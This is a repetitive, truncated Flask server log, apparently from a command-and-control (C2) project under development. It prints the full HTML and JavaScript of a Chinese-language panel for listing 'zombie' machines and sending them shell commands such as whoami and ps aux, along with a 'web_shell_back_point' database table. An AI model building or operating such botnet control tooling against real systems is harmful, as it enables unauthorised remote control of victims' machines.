         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpe3lnm_kf.__wz_cache'
2025-06-24 21:35:42 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', None, '2025-06-24 21:35:42.677288', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0034s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:35:42 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/1898210b43b31ce26cfefafd754fd639'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpa3c_nqe4.__wz_cache'
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:35:42 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0075s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:35:42 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0015s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> 殭屍機器上線: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36</p>\n            <p><strong>建立時間:</strong> 2025-06-24 21:35:42.674482</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n</script>\n\n\n\n        <!-- JavaScript 引用 -->\n        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n        \n    </body>\n    \n</html>'
2025-06-24 21:35:42 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-24 21:35:42 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '殭屍機器上線 (alt port): Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', None, '2025-06-24 21:35:42.692958', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:35:42 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/706bbdb5c277a44510634d1fea4e83c8'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpo3f9rmrf.__wz_cache'
2025-06-24 21:35:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [24/Jun/2025 21:35:42] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-24 21:35:42 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-24 21:35:42 | INFO     | control_route.py:18 | add_message() | 用戶請求添加消息 (POST)
2025-06-24 21:35:42 | INFO     | control_route.py:71 | get_messages() | 用戶請求獲取消息
2025-06-24 21:35:42 | ERROR    | control_route.py:58 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '殭屍機器上線 (alt port): Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36', None, '2025-06-24 21:35:42.697237', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-24 21:35:42 | WARNING  | file.py:272 | set() | Exception raised while handling cache file '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/10287911786bcf3e2facb102eab56640'
Traceback (most recent call last):
  File "/home/hacker/Desktop/share/C2/venv/lib/python3.12/site-packages/cachelib/file.py", line 260, in set
    fd, tmp = tempfile.mkstemp(
              ^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 496, in mkstemp
    return _mkstemp_inner(dir, prefix, suffix, flags, output_type)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.12/tempfile.py", line 395, in _mkstemp_inner
    fd = _os.open(file, flags, 0o600)
         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: '/home/hacker/Desktop/share/C2/routes/C2_control/flask_session/tmpyjuz967i.__wz_cache'
2025-06-24 21:35:42 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0022s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div 